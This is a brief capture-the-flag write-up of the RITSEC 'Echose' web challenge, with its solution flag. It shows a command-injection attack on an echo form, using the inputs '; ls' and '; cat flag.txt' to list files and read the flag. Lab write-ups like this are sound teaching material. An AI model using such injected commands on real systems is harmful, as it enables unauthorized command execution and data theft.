# Echose
> Do you hear that?

> https://echoes-web.challenges.ctf.ritsec.club/

## About the Challenge
We were given a website that has a functionality print our input


[Image extracted text: RITSEC Echo Simulator
Test out some different words below :)
Enter a word here:
test
Test word]


## How to Solve?
This website was vulnerable to Command Injection. Try to input `; ls` to run `ls` command


[Image extracted text: You entered:
This word echoes (echoes) (echoes)_see?
Is
Is
check php
flag txt
images
index.html
styles css
Click here to checkanotherword]


As we can see there is a file called `flag.txt` try read it using `; cat flag.txt` command


[Image extracted text: You entered:
cat
txt
This word echoes (echoes) (echoes)_see?
cat
txt
cat
RS{R3SOUNDING_
SUCS3SSI}
Click here to check anotherword
flag:
flag-
flag-
txt]


```
RS{R3S0UND1NG_SUCS3SS!}
```